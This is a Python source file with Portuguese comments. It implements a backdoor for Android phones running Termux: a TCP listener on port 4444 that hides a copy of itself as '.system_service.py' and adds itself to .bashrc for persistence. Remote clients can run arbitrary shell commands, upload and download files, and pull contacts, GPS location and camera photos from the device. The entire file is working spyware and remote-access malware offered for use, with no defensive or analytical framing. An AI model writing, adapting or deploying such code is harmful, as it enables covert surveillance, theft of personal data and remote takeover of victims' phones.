#!/usr/bin/env python3

import socket
import subprocess
import os
import threading
import time
import base64
import json

class SimpleBackdoor:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.running = True
        
    def start_server(self):
        """Inicia servidor backdoor"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(5)
            
            print(f"[+] Backdoor rodando na porta {self.port}")
            self.install_persistence()
            
            while self.running:
                try:
                    client, addr = server.accept()
                    print(f"[+] Conexão de {addr[0]}:{addr[1]}")
                    threading.Thread(target=self.handle_client, args=(client,)).start()
                except:
                    continue
                    
        except Exception as e:
            print(f"[!] Erro no servidor: {e}")
            
    def install_persistence(self):
        """Instala persistência básica"""
        try:
            # Adiciona ao .bashrc
            bashrc = "/data/data/com.termux/files/home/.bashrc"
            payload = f"\npython {os.path.abspath(__file__)} &\n"
            
            with open(bashrc, "a") as f:
                f.write(payload)
                
            # Cria cópia oculta
            hidden_copy = "/data/data/com.termux/files/home/.system_service.py"
            with open(__file__, 'r') as src, open(hidden_copy, 'w') as dst:
                dst.write(src.read())
            os.chmod(hidden_copy, 0o755)
            
            print("[+] Persistência instalada")
        except:
            pass
            
    def handle_client(self, client):
        """Manipula conexões de clientes"""
        try:
            # Envia informações básicas
            info = self.get_basic_info()
            client.send(json.dumps(info).encode() + b"\n")
            
            while True:
                try:
                    data = client.recv(4096).decode().strip()
                    if not data:
                        break
                        
                    if data == "exit":
                        break
                    elif data == "info":
                        response = self.get_basic_info()
                    elif data.startswith("cmd:"):
                        command = data[4:]
                        response = self.execute_command(command)
                    elif data.startswith("download:"):
                        filepath = data[9:]
                        response = self.download_file(filepath)
                    elif data.startswith("upload:"):
                        # Formato: upload:filepath:base64content
                        parts = data.split(":", 2)
                        if len(parts) == 3:
                            response = self.upload_file(parts[1], parts[2])
                        else:
                            response = "Formato inválido"
                    elif data == "ls":
                        response = self.list_files()
                    elif data == "contacts":
                        response = self.get_contacts()
                    elif data == "location":
                        response = self.get_location()
                    elif data == "photo":
                        response = self.take_photo()
                    else:
                        response = "Comando não reconhecido"
                        
                    client.send(json.dumps(response).encode() + b"\n")
                    
                except:
                    break
                    
        except:
            pass
        finally:
            client.close()
            
    def get_basic_info(self):
        """Coleta informações básicas do sistema"""
        try:
            info = {
                "hostname": socket.gethostname(),
                "user": os.getenv('USER', 'unknown'),
                "home": os.getenv('HOME', 'unknown'),
                "cwd": os.getcwd(),
                "android_version": self.get_android_version(),
                "device": self.get_device_info()
            }
            return info
        except:
            return {"error": "Falha ao coletar informações"}
            
    def get_android_version(self):
        """Obtém versão do Android"""
        try:
            result = subprocess.run(["getprop", "ro.build.version.release"], 
                                  capture_output=True, text=True)
            return result.stdout.strip()
        except:
            return "unknown"
            
    def get_device_info(self):
        """Obtém informações do dispositivo"""
        try:
            model = subprocess.run(["getprop", "ro.product.model"], 
                                 capture_output=True, text=True).stdout.strip()
            return model
        except:
            return "unknown"
            
    def execute_command(self, command):
        """Executa comando no sistema"""
        try:
            if command.startswith("cd "):
                directory = command[3:].strip()
                os.chdir(directory)
                return f"Diretório alterado para: {os.getcwd()}"
                
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            output = result.stdout + result.stderr
            return output if output else "Comando executado com sucesso"
        except subprocess.TimeoutExpired:
            return "Comando expirou"
        except Exception as e:
            return f"Erro: {str(e)}"
            
    def download_file(self, filepath):
        """Faz download de arquivo"""
        try:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                return {
                    "status": "success",
                    "filename": os.path.basename(filepath),
                    "content": content
                }
            else:
                return {"status": "error", "message": "Arquivo não encontrado"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def upload_file(self, filepath, content_b64):
        """Faz upload de arquivo"""
        try:
            content = base64.b64decode(content_b64)
            with open(filepath, 'wb') as f:
                f.write(content)
            return {"status": "success", "message": f"Arquivo salvo em {filepath}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def list_files(self):
        """Lista arquivos do diretório atual"""
        try:
            files = []
            for item in os.listdir('.'):
                if os.path.isdir(item):
                    files.append(f"[DIR]  {item}")
                else:
                    size = os.path.getsize(item)
                    files.append(f"[FILE] {item} ({size} bytes)")
            return "\n".join(files)
        except Exception as e:
            return f"Erro: {str(e)}"
            
    def get_contacts(self):
        """Extrai contatos usando termux-api"""
        try:
            result = subprocess.run(["termux-contact-list"], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return {"status": "success", "data": result.stdout}
            else:
                return {"status": "error", "message": "termux-api não disponível"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def get_location(self):
        """Obtém localização GPS"""
        try:
            result = subprocess.run(["termux-location"], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return {"status": "success", "data": result.stdout}
            else:
                return {"status": "error", "message": "GPS não disponível"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def take_photo(self):
        """Tira foto com a câmera"""
        try:
            photo_path = f"/data/data/com.termux/files/home/photo_{int(time.time())}.jpg"
            result = subprocess.run(["termux-camera-photo", photo_path])
            
            if result.returncode == 0 and os.path.exists(photo_path):
                return self.download_file(photo_path)
            else:
                return {"status": "error", "message": "Falha ao capturar foto"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

def run_background():
    """Executa backdoor em background"""
    try:
        backdoor = SimpleBackdoor()
        backdoor.start_server()
    except:
        # Se falhar, tenta novamente em 60 segundos
        time.sleep(60)
        run_background()

if __name__ == "__main__":
    # Executa em background se chamado diretamente
    run_background()
